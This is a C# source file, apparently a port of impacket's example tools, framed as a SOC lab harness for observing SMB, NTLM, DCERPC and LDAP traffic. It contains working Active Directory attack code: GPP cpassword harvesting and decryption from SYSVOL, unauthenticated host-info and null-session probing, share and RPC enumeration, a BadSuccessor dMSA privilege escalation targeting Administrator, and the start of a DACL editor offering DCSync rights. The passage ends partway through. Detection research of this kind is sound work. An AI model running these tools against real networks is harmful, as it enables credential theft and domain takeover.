using DotNetPacket.Core;
using DotNetPacket.Protocols.Dcerpc;
using DotNetPacket.Protocols.Gpp;
using DotNetPacket.Protocols.Krb5;
using DotNetPacket.Protocols.Laps;
using DotNetPacket.Protocols.Ldap;
using DotNetPacket.Protocols.Ntlm;
using DotNetPacket.Protocols.Http;
using DotNetPacket.Protocols.Smb;
using DotNetPacket.Protocols.Tds;

// DotNetPacket examples runner — the lab harness, mirroring impacket's examples/ dir.
//
// Each example is a named command that builds and/or parses protocol structures
// so their wire bytes can be observed and diffed against stock impacket in the
// SOC lab. As protocol clients are ported, add their commands here (or, as they
// grow, as a class per example). Keep output observable: hex dumps, verbose logs.

if (args.Length == 0)
{
    PrintUsage();
    return 0;
}

switch (args[0])
{
    case "smb-header":
    {
        // Build a sample SMB_COM_NEGOTIATE header and show its 32 wire bytes.
        var header = new SmbHeader
        {
            Command = 0x72, // SMB_COM_NEGOTIATE
            Flags = 0x18,
            Flags2 = 0xC853,
            Mid = 1,
        };
        Console.WriteLine("SMBv1 header (impacket smb.SMB.SMBHeader):");
        Console.Write(Hex.Dump(header.Pack()));
        return 0;
    }

    case "ntlm-negotiate":
    {
        // Build a sample NTLMSSP NEGOTIATE message and show its wire bytes.
        var message = new NtlmNegotiate
        {
            NegotiateFlags = 0xE2088297,
            DomainName = string.Empty,
            Workstation = string.Empty,
        };
        Console.WriteLine("NTLMSSP NEGOTIATE (impacket ntlm.NTLMAuthNegotiate):");
        Console.Write(Hex.Dump(message.Pack()));
        return 0;
    }

    case "smb2-negotiate":
    {
        // Live SMB2 NEGOTIATE against a lab host, mirroring a modern Windows client.
        if (args.Length < 2)
        {
            Console.Error.WriteLine("usage: smb2-negotiate <host> [port]");
            return 2;
        }

        string host = args[1];
        int port = args.Length >= 3 ? int.Parse(args[2]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        Smb2NegotiateResult result = client.Negotiate();
        Smb2NegotiateResponse response = result.Response;

        Console.WriteLine($"Connected to {host}:{port}");
        Console.WriteLine($"  Dialect:      0x{(ushort)response.DialectRevision:x4} ({response.DialectRevision})");
        Console.WriteLine($"  ServerGuid:   {Hex.ToHexString(response.ServerGuid)}");
        Console.WriteLine($"  SecurityMode: {response.SecurityMode}");
        Console.WriteLine($"  Capabilities: {response.Capabilities}");
        Console.WriteLine($"  SecBuffer:    {response.SecurityBufferLength} bytes (SPNEGO/GSS token)");
        Console.WriteLine();
        Console.WriteLine($"--> NEGOTIATE request ({result.RequestBytes.Length} bytes):");
        Console.Write(Hex.Dump(result.RequestBytes));
        Console.WriteLine($"<-- NEGOTIATE response ({result.ResponseBytes.Length} bytes):");
        Console.Write(Hex.Dump(result.ResponseBytes));
        return 0;
    }

    case "smb2-login":
    {
        // Live SMB2 NEGOTIATE + NTLMv2 SESSION_SETUP against a lab host.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: smb2-login <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        Smb2NegotiateResult negotiate = client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);

        Console.WriteLine($"Connected to {host}:{port}");
        Console.WriteLine($"  Dialect:   0x{(ushort)negotiate.Response.DialectRevision:x4} ({negotiate.Response.DialectRevision})");
        Console.WriteLine($"  SessionId: 0x{login.SessionId:x16}");
        Console.WriteLine($"  Round 1:   {NtStatus.Describe(login.Round1Status)}");
        Console.WriteLine($"  Round 2:   {NtStatus.Describe(login.Round2Status)}");
        Console.WriteLine($"  Result:    {(login.Authenticated ? "AUTHENTICATED" : "FAILED")}");
        Console.WriteLine();
        Console.WriteLine($"--> SESSION_SETUP #1 ({login.Round1Request.Length} bytes):");
        Console.Write(Hex.Dump(login.Round1Request));
        Console.WriteLine($"<-- SESSION_SETUP #1 response ({login.Round1Response.Length} bytes):");
        Console.Write(Hex.Dump(login.Round1Response));
        Console.WriteLine($"--> SESSION_SETUP #2 ({login.Round2Request.Length} bytes):");
        Console.Write(Hex.Dump(login.Round2Request));
        Console.WriteLine($"<-- SESSION_SETUP #2 response ({login.Round2Response.Length} bytes):");
        Console.Write(Hex.Dump(login.Round2Response));
        return login.Authenticated ? 0 : 1;
    }

    case "smb2-connect":
    {
        // Live NEGOTIATE + NTLMv2 SESSION_SETUP + signed TREE_CONNECT to a share.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: smb2-connect <host> <share> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string share = args[2];
        string user = args[3];
        string password = args[4];
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        Smb2NegotiateResult negotiate = client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        string uncPath = $@"\\{host}\{share}";
        Smb2TreeConnectResult tree = client.TreeConnect(uncPath);

        Console.WriteLine($"Connected to {host}:{port}");
        Console.WriteLine($"  Dialect:       0x{(ushort)negotiate.Response.DialectRevision:x4}");
        Console.WriteLine($"  Authenticated: yes (signing={(login.Signed ? "on" : "off")})");
        Console.WriteLine($"  TREE_CONNECT:  {NtStatus.Describe(tree.Status)} -> {uncPath}");
        if (tree.Connected)
        {
            Console.WriteLine($"  TreeId:        0x{tree.TreeId:x8}");
            Console.WriteLine($"  ShareType:     {tree.Response.ShareType}");
            Console.WriteLine($"  ShareFlags:    {tree.Response.ShareFlags}");
            Console.WriteLine($"  MaximalAccess: 0x{tree.Response.MaximalAccess:x8}");
            Console.WriteLine($"  ServerSig OK:  {tree.ServerSignatureValid}");
            uint disconnect = client.TreeDisconnect(tree.TreeId);
            Console.WriteLine($"  TREE_DISCONNECT: {NtStatus.Describe(disconnect)}");
        }

        return tree.Connected ? 0 : 1;
    }

    case "smb2-cat":
    {
        // Full file read: NEGOTIATE + SESSION_SETUP + TREE_CONNECT + CREATE + READ + CLOSE.
        if (args.Length < 6)
        {
            Console.Error.WriteLine("usage: smb2-cat <host> <share> <path> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string share = args[2];
        string path = args[3];
        string user = args[4];
        string password = args[5];
        string domain = args.Length >= 7 ? args[6] : string.Empty;
        int port = args.Length >= 8 ? int.Parse(args[7]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult tree = client.TreeConnect($@"\\{host}\{share}");
        if (!tree.Connected)
        {
            Console.Error.WriteLine($"Tree connect failed: {NtStatus.Describe(tree.Status)}");
            return 1;
        }

        byte[] content = client.ReadFile(tree.TreeId, path);
        client.TreeDisconnect(tree.TreeId);

        Console.WriteLine($@"Read \\{host}\{share}\{path} ({content.Length} bytes, signing={(login.Signed ? "on" : "off")}):");
        Console.WriteLine("--------");
        Console.Out.Write(System.Text.Encoding.UTF8.GetString(content));
        Console.WriteLine("--------");
        return 0;
    }

    case "dcerpc-bind":
    {
        // NEGOTIATE + SESSION_SETUP + TREE_CONNECT(IPC$) + open pipe + DCERPC BIND.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: dcerpc-bind <host> <user> <password> [interface] [domain] [port]");
            Console.Error.WriteLine("  interface: srvsvc (default) | wkssvc | lsarpc | samr | svcctl");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string interfaceName = args.Length >= 5 ? args[4] : "srvsvc";
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        DcerpcInterface? iface = DcerpcInterface.ByName(interfaceName);
        if (iface is null)
        {
            Console.Error.WriteLine($"Unknown interface '{interfaceName}'.");
            return 2;
        }

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        if (!ipc.Connected)
        {
            Console.Error.WriteLine($"IPC$ connect failed: {NtStatus.Describe(ipc.Status)}");
            return 1;
        }

        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, iface.Pipe);
        DcerpcBindAck ack = pipe.Bind(iface);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"Connected to {host}:{port}, IPC$ (signing={(login.Signed ? "on" : "off")})");
        Console.WriteLine($"  Pipe:         \\PIPE\\{iface.Pipe}");
        Console.WriteLine($"  Interface:    {iface.Name} {iface.Uuid} v{iface.VersionMajor}.{iface.VersionMinor}");
        Console.WriteLine($"  BIND reply:   {ack.PduType}");
        Console.WriteLine($"  Result:       {ack.Result} (reason {ack.Reason})");
        Console.WriteLine($"  SecondaryAddr: {ack.SecondaryAddress}");
        Console.WriteLine($"  Bound:        {(ack.Accepted ? "YES" : "NO")}");
        return ack.Accepted ? 0 : 1;
    }

    case "rpc-shares":
    {
        // Remote share enumeration via srvsvc NetrShareEnum (DCERPC over IPC$).
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-shares <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Srvsvc.Pipe);
        pipe.Bind(DcerpcInterface.Srvsvc);
        IReadOnlyList<ShareInfo1> shares = Srvsvc.NetrShareEnum(pipe);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"Shares on {host} (via srvsvc NetrShareEnum, {shares.Count}):");
        Console.WriteLine($"  {"NAME",-16} {"TYPE",-10} REMARK");
        foreach (ShareInfo1 share in shares)
        {
            string type = share.Type + (share.IsSpecial ? "*" : string.Empty);
            Console.WriteLine($"  {share.Name,-16} {type,-10} {share.Remark}");
        }

        return 0;
    }

    case "rpc-shares-sealed":
    {
        // Same srvsvc NetrShareEnum, but over an NTLMSSP-authenticated bind with
        // per-PDU packet privacy (seal) or integrity (sign) — the sign/seal RPC a
        // modern Windows client speaks. Lets the SOC capture signed/sealed DCERPC.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-shares-sealed <host> <user> <password> [seal|sign] [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        DcerpcAuthLevel level = args.Length >= 5 && args[4].Equals("sign", StringComparison.OrdinalIgnoreCase)
            ? DcerpcAuthLevel.PacketIntegrity
            : DcerpcAuthLevel.PacketPrivacy;
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Srvsvc.Pipe);
        DcerpcBindAck ack = pipe.BindAuthenticated(DcerpcInterface.Srvsvc, domain, user, password, level);
        if (!ack.Accepted)
        {
            Console.Error.WriteLine($"Authenticated bind rejected (result {ack.Result}, reason {ack.Reason}).");
            return 1;
        }

        IReadOnlyList<ShareInfo1> shares = Srvsvc.NetrShareEnum(pipe);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        string levelName = level == DcerpcAuthLevel.PacketPrivacy ? "PKT_PRIVACY (seal)" : "PKT_INTEGRITY (sign)";
        Console.WriteLine($"Shares on {host} (srvsvc NetrShareEnum over NTLMSSP {levelName}, {shares.Count}):");
        Console.WriteLine($"  {"NAME",-16} {"TYPE",-10} REMARK");
        foreach (ShareInfo1 share in shares)
        {
            string type = share.Type + (share.IsSpecial ? "*" : string.Empty);
            Console.WriteLine($"  {share.Name,-16} {type,-10} {share.Remark}");
        }

        return 0;
    }

    case "rpc-dump":
    {
        // Enumerate the RPC interfaces registered on an endpoint via the mgmt
        // interface (rpc_mgmt_inq_if_ids) — the impacket rpcdump.py recon behavior.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-dump <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Mgmt.Pipe);
        pipe.Bind(DcerpcInterface.Mgmt);
        IReadOnlyList<DcerpcInterfaceId> ifaces = Mgmt.InquireInterfaceIds(pipe);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"RPC interfaces registered on {host} (via mgmt inq_if_ids, {ifaces.Count}):");
        foreach (DcerpcInterfaceId iface in ifaces)
        {
            Console.WriteLine($"  {iface}");
        }

        return 0;
    }

    case "gpp-passwords":
    {
        // Get-GPPPassword.py: recursively crawl an SMB share (default SYSVOL) for GPP XML
        // files, carve every cpassword, and decrypt it with Microsoft's published GPP key.
        // Finding a cpassword is a misconfiguration signal; the key is public (MS14-025, 2014).
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: gpp-passwords <host> <user> <password> [domain] [share=SYSVOL] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        string share = args.Length >= 6 ? args[5] : "SYSVOL";
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult tree = client.TreeConnect($@"\\{host}\{share}");
        if (!tree.Connected)
        {
            Console.Error.WriteLine($"TREE_CONNECT to {share} failed: {NtStatus.Describe(tree.Status)}");
            return 1;
        }

        Console.WriteLine($"Crawling \\\\{host}\\{share} for GPP cpasswords (Get-GPPPassword.py)...");
        int xmlCount = 0;
        int findingCount = 0;

        // Breadth-first walk of the share, like impacket, listing each directory for *.xml.
        var queue = new Queue<string>();
        queue.Enqueue(string.Empty); // share root
        var seen = new HashSet<string>();
        while (queue.Count > 0)
        {
            string dir = queue.Dequeue();
            if (!seen.Add(dir) || seen.Count > 20_000)
            {
                continue;
            }

            IReadOnlyList<Smb2DirectoryEntry> entries;
            try
            {
                entries = client.ListDirectory(tree.TreeId, dir);
            }
            catch (IOException)
            {
                continue; // unreadable subtree — skip, keep crawling (impacket does the same)
            }

            foreach (Smb2DirectoryEntry entry in entries)
            {
                if (entry.Name is "." or "..")
                {
                    continue;
                }

                string childPath = dir.Length == 0 ? entry.Name : $@"{dir}\{entry.Name}";
                if (entry.IsDirectory)
                {
                    queue.Enqueue(childPath);
                }
                else if (entry.Name.EndsWith(".xml", StringComparison.OrdinalIgnoreCase))
                {
                    xmlCount++;
                    byte[] raw;
                    try
                    {
                        raw = client.ReadFile(tree.TreeId, childPath);
                    }
                    catch (IOException)
                    {
                        continue;
                    }

                    string content = DecodeXml(raw);
                    if (!GppPreferences.ContainsCpassword(content))
                    {
                        continue;
                    }

                    foreach (GppFinding f in GppPreferences.Parse(childPath, content))
                    {
                        findingCount++;
                        Console.WriteLine();
                        Console.WriteLine($"[+] Found a {f.Type} GPP cpassword:");
                        Console.WriteLine($"    file     : \\\\{host}\\{share}\\{f.File}");
                        if (!string.IsNullOrEmpty(f.Name)) Console.WriteLine($"    name     : {f.Name}");
                        if (!string.IsNullOrEmpty(f.UserName)) Console.WriteLine($"    userName : {f.UserName}");
                        if (!string.IsNullOrEmpty(f.NewName)) Console.WriteLine($"    newName  : {f.NewName}");
                        if (!string.IsNullOrEmpty(f.RunAs)) Console.WriteLine($"    runAs    : {f.RunAs}");
                        Console.WriteLine($"    password : {f.Password}");
                        if (!string.IsNullOrEmpty(f.Changed)) Console.WriteLine($"    changed  : {f.Changed}");
                    }
                }
            }
        }

        client.TreeDisconnect(tree.TreeId);
        Console.WriteLine();
        Console.WriteLine($"Scanned {xmlCount} XML file(s); {findingCount} cpassword finding(s).");
        return 0;
    }

    case "smb-ntlminfo":
    {
        // DumpNTLMInfo.py: dump remote host info from the NTLM handshake, no credentials.
        // SMB2 NEGOTIATE (dialect, signing, I/O sizes, times) + an anonymous SESSION_SETUP
        // whose NTLM CHALLENGE discloses host/domain/DNS names and OS build; then a
        // blank-credential AUTHENTICATE to test for a null session. Also probes SMBv1.
        if (args.Length < 2)
        {
            Console.Error.WriteLine("usage: smb-ntlminfo <host> [port]");
            return 2;
        }

        string host = args[1];
        int port = args.Length >= 3 ? int.Parse(args[2]) : 445;

        bool smb1 = Smb1NegotiateProbe.IsEnabled(host, port);

        using var client = new Smb2Client();
        client.Connect(host, port);
        Smb2NegotiateResponse nego = client.Negotiate().Response;
        Smb2NtlmInfoResult info = client.ProbeNtlmInfo();
        NtlmChallenge challenge = info.Challenge;
        AvPairs av = AvPairs.Parse(challenge.TargetInfo);

        static string Utf16(byte[]? v) => v is null ? string.Empty : System.Text.Encoding.Unicode.GetString(v);
        static string FormatSize(uint bytes)
        {
            if (bytes == 0) return "0 B";
            string[] units = { "B", "KB", "MB", "GB", "TB" };
            double size = bytes;
            int i = 0;
            while (size >= 1024 && i < units.Length - 1) { size /= 1024; i++; }
            return $"{size:0.##} {units[i]}";
        }
        static string FileTime(ulong ft) =>
            ft == 0 ? "(not provided)" : DateTime.FromFileTimeUtc((long)ft).ToString("yyyy-MM-dd HH:mm:ss 'UTC'");

        string signing = (nego.SecurityMode & Smb2SecurityMode.SigningRequired) != 0
            ? "signing enabled | required"
            : (nego.SecurityMode & Smb2SecurityMode.SigningEnabled) != 0
                ? "signing enabled (not required)"
                : "signing off";

        Console.WriteLine($"NTLM info for {host}:{port} (DumpNTLMInfo.py, no credentials)");
        Console.WriteLine($"  SMBv1 enabled    : {smb1}");
        Console.WriteLine($"  Preferred dialect: 0x{(ushort)nego.DialectRevision:x4} ({nego.DialectRevision})");
        Console.WriteLine($"  Server security  : {signing}");
        Console.WriteLine($"  Max read size    : {FormatSize(nego.MaxReadSize)} ({nego.MaxReadSize} bytes)");
        Console.WriteLine($"  Max write size   : {FormatSize(nego.MaxWriteSize)} ({nego.MaxWriteSize} bytes)");
        Console.WriteLine($"  Current time     : {FileTime(nego.SystemTime)}");
        if (nego.ServerStartTime != 0)
        {
            Console.WriteLine($"  Boot time        : {FileTime(nego.ServerStartTime)}");
        }

        // Print each name only when the server actually disclosed that AV pair (like impacket).
        void Av(string label, NtlmAvId id)
        {
            byte[]? value = av.Get(id);
            if (value is not null)
            {
                Console.WriteLine($"  {label}: {Utf16(value)}");
            }
        }

        Av("Name            ", NtlmAvId.NbComputerName);
        Av("Domain          ", NtlmAvId.NbDomainName);
        Av("DNS tree name   ", NtlmAvId.DnsTreeName);
        Av("DNS domain name ", NtlmAvId.DnsDomainName);
        Av("DNS host name   ", NtlmAvId.DnsComputerName);
        if (challenge.HasVersion)
        {
            Console.WriteLine($"  OS               : Windows NT {challenge.OsMajor}.{challenge.OsMinor} Build {challenge.OsBuild}");
        }

        Console.WriteLine($"  Null session     : {info.NullSession} ({NtStatus.Describe(info.NullSessionStatus)})");
        return 0;
    }

    case "badsuccessor":
    {
        // badsuccessor.py: the dMSA "BadSuccessor" technique (Windows Server 2025). Actions:
        //   search  — enumerate OUs and report identities with create/modify rights on them
        //             (the permission that enables the attack); reads nTSecurityDescriptor.
        //   add/delete/modify — create / remove / repoint a dMSA via LDAP writes.
        // LAB-ONLY. The dMSA object class only exists on a Server-2025 schema, which Samba lacks,
        // so add/modify can't complete here (the LDAP write encoding is still exercised); the
        // search path works against any DC's OU ACLs.
        if (args.Length < 6)
        {
            Console.Error.WriteLine("usage: badsuccessor <search|add|delete|modify> <host> <user> <password> <domain-fqdn> [options]");
            Console.Error.WriteLine("  add    : badsuccessor add <host> <user> <pass> <domain-fqdn> <dmsa-name> <target-ou-dn> [target-account]");
            Console.Error.WriteLine("  delete : badsuccessor delete <host> <user> <pass> <domain-fqdn> <dmsa-name> <target-ou-dn>");
            Console.Error.WriteLine("  modify : badsuccessor modify <host> <user> <pass> <domain-fqdn> <dmsa-name> <target-ou-dn> <target-account>");
            return 2;
        }

        string action = args[1];
        string host = args[2];
        string user = args[3];
        string password = args[4];
        string domainFqdn = args[5];
        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
        string bindName = user.Contains('@') ? user : $"{user}@{domainFqdn}";
        const string DmsaGuid = "0feb936f-47b3-49f2-9386-1dedc2c23765"; // msDS-DelegatedManagedServiceAccount

        using LdapConnection ldap = LdapConnection.Connect(host, 389);
        LdapBindResponse bind = ldap.SimpleBind(bindName, password);
        if (!bind.Success)
        {
            Console.Error.WriteLine($"Bind failed (result {bind.ResultCode}): {bind.DiagnosticMessage}");
            return 1;
        }

        // Resolve a sAMAccountName to its objectSid (canonical string), or "" if not found.
        string ResolveSid(string sam)
        {
            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
                LdapFilter.AllOf(LdapFilter.PresentOf("objectClass"), LdapFilter.Equal("sAMAccountName", sam)),
                new[] { "objectSid" });
            byte[]? raw = es.Count > 0 ? es[0].GetRaw("objectSid") : null;
            return raw is null ? string.Empty : LdapSid.ToCanonical(raw);
        }

        // Resolve a SID (canonical) back to a sAMAccountName, or the SID string if unresolved.
        string ResolveName(string sidString)
        {
            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
                LdapFilter.EqualRaw("objectSid", LdapSid.FromCanonical(sidString)), new[] { "sAMAccountName" });
            string name = es.Count > 0 ? es[0].Get("sAMAccountName") : string.Empty;
            return string.IsNullOrEmpty(name) ? sidString : name;
        }

        if (action == "search")
        {
            // Domain SID from the domain object (to exclude Domain/Enterprise Admins), like impacket.
            string domainSid = string.Empty;
            IReadOnlyList<SearchEntry> domEs = ldap.Search(baseDn,
                LdapFilter.Equal("objectClass", "domain"), new[] { "objectSid" }, LdapSearchScope.BaseObject);
            if (domEs.Count > 0 && domEs[0].GetRaw("objectSid") is { } domRaw)
            {
                domainSid = LdapSid.ToCanonical(domRaw);
            }
            IReadOnlyList<SearchEntry> ous = ldap.Search(baseDn,
                LdapFilter.Equal("objectClass", "organizationalUnit"),
                new[] { "distinguishedName", "nTSecurityDescriptor" });

            const uint relevantRights = 0x00000001 /*CreateChild*/ | 0x10000000 /*GenericAll*/
                | 0x00040000 /*WriteDACL*/ | 0x00080000 /*WriteOwner*/;
            var identityToOus = new SortedDictionary<string, SortedSet<string>>(StringComparer.OrdinalIgnoreCase);

            bool IsExcluded(string sid) =>
                sid is "S-1-5-32-544" or "S-1-5-18"
                || (!string.IsNullOrEmpty(domainSid) && sid.StartsWith(domainSid) && (sid.EndsWith("-512") || sid.EndsWith("-519")));

            void Add(string sid, string ouDn)
            {
                if (IsExcluded(sid)) return;
                string id = ResolveName(sid);
                if (!identityToOus.TryGetValue(id, out SortedSet<string>? set))
                {
                    identityToOus[id] = set = new SortedSet<string>(StringComparer.OrdinalIgnoreCase);
                }
                set.Add(ouDn);
            }

            foreach (SearchEntry ou in ous)
            {
                byte[]? sdBytes = ou.GetRaw("nTSecurityDescriptor");
                string ouDn = ou.Get("distinguishedName");
                if (sdBytes is null || string.IsNullOrEmpty(ouDn)) continue;

                LdapSecurityDescriptor sd = LdapSecurityDescriptor.Parse(sdBytes);
                foreach (LdapAce ace in sd.DaclAces)
                {
                    if (ace.AceType is not (LdapSecurityDescriptor.AccessAllowedAceType or LdapSecurityDescriptor.AccessAllowedObjectAceType))
                        continue;
                    if ((ace.Mask & relevantRights) == 0) continue;
                    // Object ACEs only count for the dMSA class or "all objects".
                    if (ace.ObjectType is { } g && g != Guid.Empty && !string.Equals(g.ToString(), DmsaGuid, StringComparison.OrdinalIgnoreCase))
                        continue;
                    Add(ace.Sid, ouDn);
                }

                if (!string.IsNullOrEmpty(sd.OwnerSid)) Add(sd.OwnerSid, ouDn);
            }

            Console.WriteLine($"BadSuccessor OU permission review on {host} ({ous.Count} OUs)");
            Console.WriteLine();
            Console.WriteLine($"{"Identity",-45} Vulnerable OUs");
            Console.WriteLine($"{new string('-', 45)} {new string('-', 30)}");
            if (identityToOus.Count == 0)
            {
                Console.WriteLine($"{"(none)",-45} (none)");
            }
            foreach ((string id, SortedSet<string> set) in identityToOus)
            {
                Console.WriteLine($"{(id.Length > 44 ? id[..44] : id),-45} {{{string.Join(", ", set)}}}");
            }
            return 0;
        }

        // add/delete/modify need a dMSA name + target OU DN.
        if (args.Length < 8)
        {
            Console.Error.WriteLine($"'{action}' needs <dmsa-name> <target-ou-dn> (see usage).");
            return 2;
        }

        string dmsaName = args[6];
        string targetOu = args[7];
        string dmsaDn = $"CN={dmsaName},{targetOu}";

        if (action == "delete")
        {
            LdapResult del = ldap.Delete(dmsaDn);
            Console.WriteLine(del.Success
                ? $"[+] Deleted dMSA {dmsaName}$ ({dmsaDn})"
                : $"[-] Delete failed (result {del.ResultCode}): {del.DiagnosticMessage}");
            return del.Success ? 0 : 1;
        }

        if (action == "modify")
        {
            string targetAccount = args.Length > 8 ? args[8] : "Administrator";
            string targetDn = ResolveDn(ldap, baseDn, targetAccount);
            if (string.IsNullOrEmpty(targetDn))
            {
                Console.Error.WriteLine($"Target account not found: {targetAccount}");
                return 1;
            }

            LdapResult mod = ldap.ModifyReplace(dmsaDn, "msDS-ManagedAccountPrecededByLink",
                new[] { System.Text.Encoding.UTF8.GetBytes(targetDn) });
            Console.WriteLine(mod.Success
                ? $"[+] Repointed {dmsaName}$ msDS-ManagedAccountPrecededByLink -> {targetDn}"
                : $"[-] Modify failed (result {mod.ResultCode}): {mod.DiagnosticMessage}");
            return mod.Success ? 0 : 1;
        }

        // action == add
        string addTarget = args.Length > 8 ? args[8] : "Administrator";
        string dns = $"{dmsaName.ToLowerInvariant()}.{domainFqdn}";
        string principalSid = ResolveSid(user);
        string addTargetDn = ResolveDn(ldap, baseDn, addTarget);

        static (string, IReadOnlyList<byte[]>) S(string t, string v) => (t, new[] { System.Text.Encoding.UTF8.GetBytes(v) });
        var attrs = new List<(string, IReadOnlyList<byte[]>)>
        {
            S("objectClass", "msDS-DelegatedManagedServiceAccount"),
            S("cn", dmsaName),
            S("sAMAccountName", $"{dmsaName}$"),
            S("dNSHostName", dns),
            S("userAccountControl", "4096"),
            S("msDS-ManagedPasswordInterval", "30"),
            S("msDS-DelegatedMSAState", "2"),
            S("msDS-SupportedEncryptionTypes", "28"),
            S("accountExpires", "9223372036854775807"),
        };
        if (!string.IsNullOrEmpty(principalSid))
        {
            byte[] sd = LdapSecurityDescriptor.BuildGroupMsaMembership(principalSid);
            attrs.Add(("msDS-GroupMSAMembership", new[] { sd }));
        }
        if (!string.IsNullOrEmpty(addTargetDn))
        {
            attrs.Add(S("msDS-ManagedAccountPrecededByLink", addTargetDn));
        }

        LdapResult add = ldap.Add(dmsaDn, attrs);
        if (add.Success)
        {
            Console.WriteLine($"[+] Created dMSA {dmsaName}$ in {targetOu} (preceded-by {addTarget})");
            return 0;
        }

        Console.Error.WriteLine($"[-] Add failed (result {add.ResultCode}): {add.DiagnosticMessage}");
        Console.Error.WriteLine("    (On a non-Server-2025 DC such as Samba the dMSA object class does not exist.)");
        return 1;
    }

    case "dacledit":
    {
        // dacledit.py: read and edit the DACL of an object's security descriptor over LDAP.
        //   read    — search the target's nTSecurityDescriptor (SD-flags control = DACL only),
        //             parse the DACL and print each ACE (type / mask / trustee / object GUID).
        //   write   — append an allowed/denied ACE granting <principal> a right, then ModifyReplace
        //             nTSecurityDescriptor (same SD-flags control). backup is written first.
        //   remove  — drop every ACE matching the built template, then ModifyReplace.
        //   backup  — dump the target's raw SD (hex) to a file.
        //   restore — push a previously backed-up SD from a file.
        // The distinctive wire artifacts are the LDAP_SERVER_SD_FLAGS control (0x04) on the search
        // and on the modify, and the re-serialized security descriptor. LAB-ONLY; see docs.
        if (args.Length < 7)
        {
            Console.Error.WriteLine("usage: dacledit <read|write|remove|backup|restore> <host> <user> <password> <domain-fqdn> <target> [principal] [rights] [ace-type] [file]");
            Console.Error.WriteLine("  rights   : FullControl (default) | ResetPassword | WriteMembers | DCSync | 0x<mask>");
